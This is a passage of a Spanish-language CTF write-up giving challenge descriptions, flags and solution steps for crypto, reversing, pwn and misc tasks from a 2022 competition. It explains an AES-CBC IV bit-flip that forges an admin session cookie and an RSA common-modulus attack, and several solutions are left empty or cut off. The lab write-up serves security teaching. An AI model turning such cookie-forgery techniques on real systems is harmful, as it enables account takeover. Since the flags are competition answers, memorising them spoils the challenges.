<h4 id="solución-5"><a class="header" href="#solución-5">Solución</a></h4>
<p>Después de pasar el texto obtenido a <a href="https://gchq.github.io/CyberChef/">Cyberchef</a> se obtuvo el resultado de la <a href="https://gchq.github.io/CyberChef/#recipe=From_Base85(&#x27;!-u&#x27;,true)From_Base32(&#x27;A-Z2-7%3D&#x27;,false)From_Base64(&#x27;A-Za-z0-9%2B/%3D&#x27;,true,false)From_Hex(&#x27;None&#x27;)&amp;input=OG00Vl8xLzFEOjhRJi9OPSZgJ3I4ayhbLDEsYCZkOi9YVlE8RSlYSThsZTtLO2JdVlQ6LmVQZDc5PERmOUxXLGIxZmNBODduUTxROFFKTT84bTRuaDtiXjFjOi5lI1U1dV5mPThsXSJfMkhFMUs6ZUY4SDc5KXI7">receta</a>, mediante un múltiple encoding de bases: Base85 -&gt; Base32 -&gt; Base64 -&gt; A hexadecimal para por último obtener el valor de la bandera.</p>
<p><img src="images/crypto_encoding_1.png" alt="Valor de bandera" /></p>
<p>Flag: <code>LPM{3nc0ding_iS_b4sIc}</code></p>
<h3 id="esoteric0"><a class="header" href="#esoteric0">Esoteric0</a></h3>
<h4 id="info-6"><a class="header" href="#info-6">Info</a></h4>
<div class="table-wrapper"><table><thead><tr><th>Atributo</th><th>Valor</th></tr></thead><tbody>
<tr><td>Descripción</td><td>¡¡Esto es del diablo!! ¿puedes recuperar la flag?</td></tr>
<tr><td>Archivos</td><td><a href="https://github.com/srrequiem/CTF-Challenge-Compilation/tree/main/20220922_ipn_core_2022/files/crypto_esoteric.txt">crypto_esoteric.txt</a></td></tr>
</tbody></table>
</div>
<h4 id="solución-6"><a class="header" href="#solución-6">Solución</a></h4>
<p>Después de repasar el nombre y la descripción se pudo identificar que se trataba de un <a href="https://en.wikipedia.org/wiki/Esoteric_programming_language">lenguaje de programación esotérico</a> y partiendo directamente de la descripción va acorde a la descripción que se puede leer en el lenguaje <strong>Malbolge</strong>. Por lo que al usar un <a href="https://malbolge.doleczek.pl/">intérprete de este lenguaje</a> se puede obtener el valor de la bandera pegando el contenido proporcionado y ejecutando el programa.</p>
<p><img src="images/crypto_esoterico_1.png" alt="Valor de bandera" /></p>
<p>Flag: <code>LPM{3Xel3ntE_C0noC3s_LaS_4rTes_0scUr4s}</code></p>
<h3 id="aesy"><a class="header" href="#aesy">AESy</a></h3>
<h4 id="info-7"><a class="header" href="#info-7">Info</a></h4>
<div class="table-wrapper"><table><thead><tr><th>Atributo</th><th>Valor</th></tr></thead><tbody>
<tr><td>Descripción</td><td>¿Podrás romper la cookie y obtener acceso como admin?</td></tr>
<tr><td>Archivos</td><td><a href="https://github.com/srrequiem/CTF-Challenge-Compilation/tree/main/20220922_ipn_core_2022/files/crypto_aesy_chall.py">crypto_aesy_chall.py</a></td></tr>
</tbody></table>
</div>
<h4 id="solución-7"><a class="header" href="#solución-7">Solución</a></h4>
<p>Realizando un análisis al código fuente se identificó que al realizar el proceso de login se genera una cookie de sesión compuesta por 64 caracteres (en hexadecimal), de los cuales la mitad corresponde al <code>iv</code> que es utilizado en el proceso de cifrado y descifrado de la aplicación. Y la otra mitad a lo cifrado del usuario según las siguientes líneas de código:</p>
<p><img src="images/crypto_aesy_1.png" alt="Creación de cookie" /></p>
<ol>
<li>Método de cifrado invocado.</li>
<li>Retorno de valor <code>iv</code> + texto cifrado.</li>
</ol>
<p>Al buscar vulnerabilidades con el método empleado de AES CBC se encontró el <a href="https://derekwill.com/2021/01/01/aes-cbc-mode-chosen-plaintext-attack/">blog</a> y el <a href="https://www.youtube.com/watch?v=QG-z0r9afIs">video</a> en donde se explica la razón de la vulnerabilidad que parte de conocer los bytes correspondientes del <code>iv</code> y los bytes de lo cifrado.</p>
<p>Dado que el proceso de AES CBC hace uso de XOR y se nos proporciona el resultado, en resumen bastaría en calcular el byte correspondiente de sólo una de las letras dado que espera obtener <code>admin</code>. Extrayendo la cookie de sesión generada con <code>bdmin</code> por medio de <code>/login?username=bdmin</code> se obtiene <code>53456027e7f7e1022fa753f620aeac956f8b13fcc80f33b5a5b6feb140b2878f</code>.</p>
<p><img src="images/crypto_aesy_2.png" alt="Cookie obtenida" /></p>
<pre><code class="language-text">Cookie obtenida: 53456027e7f7e1022fa753f620aeac956f8b13fcc80f33b5a5b6feb140b2878f

IV (cookie): 53456027e7f7e1022fa753f620aeac95

Cifrado (cookie): 6f8b13fcc80f33b5a5b6feb140b2878f
</code></pre>
<p>Tomando en cuenta el proceso que sigue AES CBC lo que se necesitaría sería encontrar el valor del <code>iv</code> correspondiente para cambiar la <code>b</code> por <code>a</code> de <code>dmin</code> para ello se debería seguir:</p>
<pre><code class="language-text">Primer byte correspondiente de IV: 53
Primer byte correspondiente de lo cifrado: 6f
Valor de b en hexadecimal: 62

53 ^ (6f)? = 62

Para encontrar el valor correspondiente de lo cifrado se realiza el siguiente XOR:

53 ^ 62 = 31

Por lo tanto se puede decir que:

53 ^ 31 = 62

Conociendo este valor se puede buscar el varlo de IV que produciría a (61 en hexadecimal):

? ^ 31 = 61

De acuerdo a las propiedades el XOR se podría realizar la siguiente operación para encontrar el segmento faltante:

31 ^ 61 = ? (50)

Por lo tanto se puede decir que:

50 ^ 31 = 61
</code></pre>
<p>Tomando en cuenta lo anterior se podría sustituir el primer byte del <code>iv</code> de la cookie por 50 para obtener así la bandera.</p>
<p><img src="images/crypto_aesy_3.png" alt="Obtención de bandera" /></p>
<p>Flag: <code>LPM{c0nOc3sl4||4v3_c13rt0?}</code></p>
<h3 id="realbabyrsa"><a class="header" href="#realbabyrsa">RealBabyRSA</a></h3>
<h4 id="info-8"><a class="header" href="#info-8">Info</a></h4>
<div class="table-wrapper"><table><thead><tr><th>Atributo</th><th>Valor</th></tr></thead><tbody>
<tr><td>Descripción</td><td>RSA... ¡que común!</td></tr>
<tr><td>Archivos</td><td><a href="https://github.com/srrequiem/CTF-Challenge-Compilation/blob/main/20220922_ipn_core_2022/files/crypto_real_baby_rsa_output.txt">crypto_real_baby_rsa_output.txt</a> <a href="https://github.com/srrequiem/CTF-Challenge-Compilation/blob/main/20220922_ipn_core_2022/files/crypto_real_baby_rsa_reto.py">crypto_real_baby_rsa_reto.py</a></td></tr>
</tbody></table>
</div>
<h4 id="solución-8"><a class="header" href="#solución-8">Solución</a></h4>
<p>Después de visualizar el código fuente y buscar un <a href="https://www.rose-hulman.edu/class/ma/holden/Archived_Courses/Math479-0304/resources/attacks-rsa/">resumen de los ataques a RSA</a> se puede percatar que ambos valores de la salida:</p>
<pre><code class="language-python">ct1=pow(FLAG,e1,n)
ct2=pow(FLAG,e2,n)
</code></pre>
<p>Estan usando el mismo módulo para las operaciones, por lo que al buscar dentro del resumen antes indicado se encontró <a href="https://infosecwriteups.com/rsa-attacks-common-modulus-7bdb34f331a5">este artículo</a> en donde se detalla un escenario similar y explica en dónde radica la vulnerabilidad, además de brindar el código fuente de la solución. Por lo que al hacer uso del script se obtiene la bandera.</p>
<p><img src="images/crypto_real_baby_rsa_1.png" alt="Obtención de bandera" /></p>
<p>Flag: <code>LPM{P3rf3ctO!_c0N0c3s_Rs4_y_Sus_vuln3r4b1l1d4d3zzzz}</code></p>
<h3 id="baby-fa"><a class="header" href="#baby-fa">Baby-FA</a></h3>
<h4 id="info-9"><a class="header" href="#info-9">Info</a></h4>
<div class="table-wrapper"><table><thead><tr><th>Atributo</th><th>Valor</th></tr></thead><tbody>
<tr><td>Descripción</td><td>¿Seguirás el camino fácil?<br>La flag es en minúsculas</td></tr>
<tr><td>Archivos</td><td><a href="https://github.com/srrequiem/CTF-Challenge-Compilation/tree/main/20220922_ipn_core_2022/files/crypto_baby_fa.txt">crypto_baby_fa.txt</a></td></tr>
</tbody></table>
</div>
<h4 id="solución-9"><a class="header" href="#solución-9">Solución</a></h4>
<p>Al identificar el formato de la bandera al final del texto por deducción:</p>
<pre><code class="language-text">pkca: ksn{efliaetkag_hctekejcjag_ja_cfckegeg}
flag: lpm{efliaetkag_hctekejcjag_ja_cfckegeg}
</code></pre>
<p>Se concluyó que era algún tipo de sustitución por lo que se utilizó esta <a href="https://gchq.github.io/CyberChef/#recipe=Substitute(&#x27;abcdefghijklmnopqrstuvwxyz&#x27;,&#x27;ebadinshrdlcmmofqrpbuvwxyz&#x27;)&amp;input=a2NiYmVsYS10Y2dhaiBsaXJzYmRhaWNzaHIgZWcgYmhhIGFhZmFpZWwgYmFpbiBwZGkgbGRmZ2JpbWxiZWRmZyBkcCBsaXJzYmRhaWNzaGVsIHNpZW5lYmV1YWcgYmhjYiBlZnVka3VhIGtjYmJlbGFnLCBhZWJoYWkgZWYgYmhhIGxkZmdiaW1sYmVkZiBlYmdha3AgZGkgZWYgYmhhIGdhbG1pZWJyIHNpZGRwLiBrY2JiZWxhLXRjZ2FqIGxkZmdiaW1sYmVkZmcgY2lhIGxtaWlhZmJrciBlbnNkaWJjZmIgbGNmamVqY2JhZyBwZGkgc2RnYi15bWNmYm1uIGxpcnNiZGFpY3Noci4gbWZrZXZhIG5kaWEgb2VqYWtyIG1nYWogY2ZqIHZmZG9mIHNtdGtlbC12YXIgZ2xoYW5hZyBnbWxoIGNnIGJoYSBpZ2MsIGplcHBlYS1oYWtrbmNmIGRpIGFra2VzYmVsLWxtaXVhIGxpcnNiZGdyZ2JhbmfigJRvaGVsaCBsZG1raiwgYmhhZGlhYmVsY2trciwgdGEgamFwYWNiYWogbWdlZmEgZ2hkaSdnIGNrYWRpZWJobiBkZiBjIHltY2ZibW4gbGRuc21iYWnigJRnZG5hIGtjYmJlbGEtdGNnYWogbGRmZ2JpbWxiZWRmZyBjc3NhY2kgYmQgdGEgaWFnZWdiY2ZiIGJkIGNiYmNsdiB0ciB0ZGJoIGxrY2dnZWxjayBjZmogeW1jZmJtbiBsZG5zbWJhaWcuIHBtaWJoYWluZGlhLCBuY2ZyIGtjYmJlbGEtdGNnYWogbGRmZ2JpbWxiZWRmZyBjaWEgbGRmZ2VqYWlhaiBiZCB0YSBnYWxtaWEgbWZqYWkgYmhhIGNnZ21uc2JlZGYgYmhjYiBsYWliY2VmIG9ha2stZ2JtamVhaiBsZG5zbWJjYmVkZmNrIGtjYmJlbGEgc2lkdGthbmcgbGNmZmRiIHRhIGdka3VhaiBhcHBlbGVhZmJrci4KcGtjYToga3Nue2VmbGlhZXRrYWdfaGN0ZWtlamNqYWdfamFfY2Zja2VnZWd9">receta de cyberchef</a>, adicional buscando un tipo de fuerza bruta respecto a la sustitución se encontró esta <a href="https://planetcalc.com/8047/">calculadora en línea</a> en donde al copiar el texto dado se obtuvo el valor de la bandera.</p>
<p><img src="images/crypto_baby_fa_1.png" alt="Obtención de bandera" /></p>
<p>Flag: <code>lpm{increibles_habilidades_de_analisis}</code></p>
<h2 id="reversing"><a class="header" href="#reversing">Reversing</a></h2>
<h3 id="t3sla"><a class="header" href="#t3sla">T3SLA</a></h3>
<h4 id="info-10"><a class="header" href="#info-10">Info</a></h4>
<div class="table-wrapper"><table><thead><tr><th>Atributo</th><th>Valor</th></tr></thead><tbody>
<tr><td>Descripción</td><td>Cadena fue de visita a la ESCOM en su nuevo Tsl4. Pero olvidó sus llaves en el laboratorio de redes y estará cerrado hasta mañana por el paro :( . Por suerte tu eres su amigo y le ayudarás a abrir el auto. Lo primero será revisar el firmware buscando la función encargada de validar la llave.</td></tr>
<tr><td>Archivos</td><td><a href="https://github.com/srrequiem/CTF-Challenge-Compilation/tree/main/20220922_ipn_core_2022/files/reversing_t3sla_chall">reversing_t3sla_chall</a></td></tr>
</tbody></table>
</div>
<h4 id="solución-10"><a class="header" href="#solución-10">Solución</a></h4>
<p>Al pasar el binario por ghidra y ver la función indicada (<code>chequeo</code>) se pueden visualizar múltiples variables con valores hexadecimales, al convertir los valores se puede extraer la bandera, considerando que la distribución de los valores se encuentra en little-endian:</p>
<p><img src="images/rev_tesla_1.png" alt="Variables en hexadecimal" /></p>
<p><img src="images/rev_tesla_2.png" alt="Conversión de hexadecimal a ascii" /></p>
<p>Flag: <code>flag{Fl4G_0cULtA-R3vErS1n}</code></p>
<h3 id="t3sla---parte-2"><a class="header" href="#t3sla---parte-2">T3SLA - Parte 2</a></h3>
<h4 id="info-11"><a class="header" href="#info-11">Info</a></h4>
<div class="table-wrapper"><table><thead><tr><th>Atributo</th><th>Valor</th></tr></thead><tbody>
<tr><td>Descripción</td><td>Cuando la llave se comunica con el auto lo primero que hace es enviar una clave de 4 dígitos (que llegan a la función de chequeo como los primeros 4 parámetros).  ¿Cuáles son esos 4 dígitos correctos? <br> La flag es: flag{EncontrasteMiPin=PIN} Reemplazando PIN por los 4 dígitos correctos. <br> <strong>NOTA: Para este reto deberás utilizar los mismo archivos del reto T3SLA</strong></td></tr>
<tr><td>Archivos</td><td>-</td></tr>
</tbody></table>
</div>
<h4 id="solución-11"><a class="header" href="#solución-11">Solución</a></h4>
<p>Posteriormente en la misma función de <code>chequeo</code> se verifican el PIN 1 a 1 respecto los argumentos recibidos, completando así el PIN que se verifica.</p>
<p><img src="images/rev_tesla_3.png" alt="Validación de PIN" /></p>
<p>Flag: <code>flag{EncontrasteMiPin=7395}</code></p>
<h3 id="t3sla---parte-3"><a class="header" href="#t3sla---parte-3">T3SLA - Parte 3</a></h3>
<h4 id="info-12"><a class="header" href="#info-12">Info</a></h4>
<div class="table-wrapper"><table><thead><tr><th>Atributo</th><th>Valor</th></tr></thead><tbody>
<tr><td>Descripción</td><td>Ahora que conocemos el PIN, lo único que nos resta para poder abrir el auto es conocer el password que se envía junto a la clave de 4 dígitos. Esta password la lee la misma función de chequeo. La flag es la password. <br> ej.  flag{PASSWORD} <br> <strong>NOTA: Para este reto deberás utilizar los mismo archivos del reto T3SLA</strong></td></tr>
<tr><td>Archivos</td><td>-</td></tr>
</tbody></table>
</div>
<h4 id="solución-12"><a class="header" href="#solución-12">Solución</a></h4>
<p>Dándole seguimiento al código fuente obtenido, se puede ver que:</p>
<ol>
<li>Se realiza una validación respeto al tamaño de la variable donde será almacenada la contraseña, validando que sea de 28 caracteres (0x1c).</li>
<li>Del valor que se pone se realiza un XOR de cada uno de sus elementos.</li>
<li>Se realiza otra validación en memoria si</li>
</ol>
<p>Flag: <code>flag{}</code></p>
<h2 id="pwning"><a class="header" href="#pwning">Pwning</a></h2>
<h3 id="babypwn"><a class="header" href="#babypwn">BabyPWN</a></h3>
<h4 id="info-13"><a class="header" href="#info-13">Info</a></h4>
<div class="table-wrapper"><table><thead><tr><th>Atributo</th><th>Valor</th></tr></thead><tbody>
<tr><td>Descripción</td><td>Este es otro reto de PWN más, pero no te apures te estaré guiando :) <br> El primer paso para conseguir RCE es buscar algún bug de corrupción de memoria que nos permita tomar control del flujo de ejecución. <br> ¡Suerte!</td></tr>
<tr><td>Archivos</td><td><a href="https://github.com/srrequiem/CTF-Challenge-Compilation/tree/main/20220922_ipn_core_2022/files/pwn_babypwn_chall">pwn_babypwn_chall</a> <a href="https://github.com/srrequiem/CTF-Challenge-Compilation/tree/main/20220922_ipn_core_2022/files/pwn_babypwn_chall.c">pwn_babypwn_chall.c</a></td></tr>
</tbody></table>
</div>
<h4 id="solución-13"><a class="header" href="#solución-13">Solución</a></h4>
<h3 id="babypwn---parte-2"><a class="header" href="#babypwn---parte-2">BabyPWN - Parte 2</a></h3>
<h4 id="info-14"><a class="header" href="#info-14">Info</a></h4>
<div class="table-wrapper"><table><thead><tr><th>Atributo</th><th>Valor</th></tr></thead><tbody>
<tr><td>Descripción</td><td>Para mala suerte la función cuenta con un mecanismo de seguridad conocido como stack canary que es una variable en la pila con un valor que si se modifica entonces el programa sabe que esta bajo un posible ataque. La buena noticia es que este stack canary tiene siempre el mismo valor.  Esta vez, cuando hagas el overflow asegúrate de escribir sobre el stack canary el valor correcto. <br> <strong>NOTA: Para este reto deberás utilizar los mismo archivos del reto BabyPWN</strong></td></tr>
<tr><td>Archivos</td><td>-</td></tr>
</tbody></table>
</div>
<h4 id="solución-14"><a class="header" href="#solución-14">Solución</a></h4>
<h3 id="babypwn---parte-3"><a class="header" href="#babypwn---parte-3">BabyPWN - Parte 3</a></h3>
<h4 id="info-15"><a class="header" href="#info-15">Info</a></h4>
<div class="table-wrapper"><table><thead><tr><th>Atributo</th><th>Valor</th></tr></thead><tbody>
<tr><td>Descripción</td><td>Como último paso necesitamos controlar ese flujo de ejecución;  por suerte, el programa imprime la cadena que le dimos usando la función system y como parámetro le pasa una cadena que almacena... ¡¡¡EN LA PILA!!!,  por lo que con nuestro overflow podremos modificar ese argumento para ejecutar system con lo que nosotros queramos ¡Suerte! :) <br> <strong>NOTA: Para este reto deberás utilizar los mismo archivos del reto BabyPWN</strong></td></tr>
<tr><td>Archivos</td><td>-</td></tr>
</tbody></table>
</div>
<h4 id="solución-15"><a class="header" href="#solución-15">Solución</a></h4>
<h2 id="misc"><a class="header" href="#misc">Misc</a></h2>
<h3 id="bot-calculadora"><a class="header" href="#bot-calculadora">Bot Calculadora</a></h3>
<h4 id="info-16"><a class="header" href="#info-16">Info</a></h4>
<div class="table-wrapper"><table><thead><tr><th>Atributo</th><th>Valor</th></tr></thead><tbody>
<tr><td>Descripción</td><td>Acabamos de descubrir e implementar una característica de Node.js del módulo vm y creamos una calculadora para usarlo, échale un lente crack. <br> <em><strong>NOTA: ÉSTE RETO TIENE PUNTAJE DINÁMICO,  MIENTRAS MÁS PERSONAS LO RESUELVAN EL PUNTAJE IRÁ DISMINUYENDO</strong></em> <br> https://t.me/node_vm_bot</td></tr>
<tr><td>Archivos</td><td><a href="https://github.com/srrequiem/CTF-Challenge-Compilation/tree/main/20220922_ipn_core_2022/files/misc_bot_bot_calculadora.zip">misc_bot_bot_calculadora.zip</a></td></tr>
</tbody></table>
</div>
<h4 id="solución-16"><a class="header" href="#solución-16">Solución</a></h4>

                    </main>

                    <nav class="nav-wrapper" aria-label="Page navigation">
                        <!-- Mobile navigation buttons -->
                            <a rel="prev" href="../../cheat_sheets/transfer.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                                <i class="fa fa-angle-left"></i>
                            </a>
                            <a rel="next" href="../../htb/battlegrounds/mayhem/index.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                                <i class="fa fa-angle-right"></i>
                            </a>
                        <div style="clear: both"></div>
                    </nav>
                </div>
            </div>

            <nav class="nav-wide-wrapper" aria-label="Page navigation">
                    <a rel="prev" href="../../cheat_sheets/transfer.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                        <i class="fa fa-angle-left"></i>
                    </a>
                    <a rel="next" href="../../htb/battlegrounds/mayhem/index.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                        <i class="fa fa-angle-right"></i>
                    </a>
            </nav>

        </div>

        <script type="text/javascript">
            window.playground_copyable = true;
        </script>
        <script src="../../elasticlunr.min.js" type="text/javascript" charset="utf-8"></script>
        <script src="../../mark.min.js" type="text/javascript" charset="utf-8"></script>
        <script src="../../searcher.js" type="text/javascript" charset="utf-8"></script>
        <script src="../../clipboard.min.js" type="text/javascript" charset="utf-8"></script>
        <script src="../../highlight.js" type="text/javascript" charset="utf-8"></script>
        <script src="../../book.js" type="text/javascript" charset="utf-8"></script>

        <!-- Custom JS scripts -->
    </body>
</html>
